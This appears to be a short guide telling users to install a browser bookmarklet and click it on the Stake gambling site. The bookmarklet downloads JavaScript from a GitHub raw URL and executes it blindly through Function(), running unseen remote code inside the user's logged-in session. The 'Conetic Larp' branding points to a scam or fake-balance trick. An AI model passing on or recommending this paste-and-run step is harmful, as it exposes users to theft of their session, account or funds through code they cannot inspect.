## 🧩 Option 1: Bookmark (Quick & Easy – Desktop)

This method works great on **Chrome, Firefox, Edge**, etc.

1. **Copy this entire code:**

   ```js
   javascript:(()=>{fetch('https://raw.githubusercontent.com/drojnisdisauioa/stake/refs/heads/main/bookmark.js').then(r=>r.text()).then(code=>Function(code)());})();
   ```

2. **Create a new bookmark**:

   * On **Chrome/Firefox**: Right-click your bookmarks bar → click **"Add Page"** or **"Add Bookmark"**.
   * Give it a name like `💸 Conetic Larp`.

3. **Paste the code** into the **URL or Location** field.

4. Click **Save**.

5. Go to the **Stake** website, then **click your new bookmark** — and boom, it runs automatically.
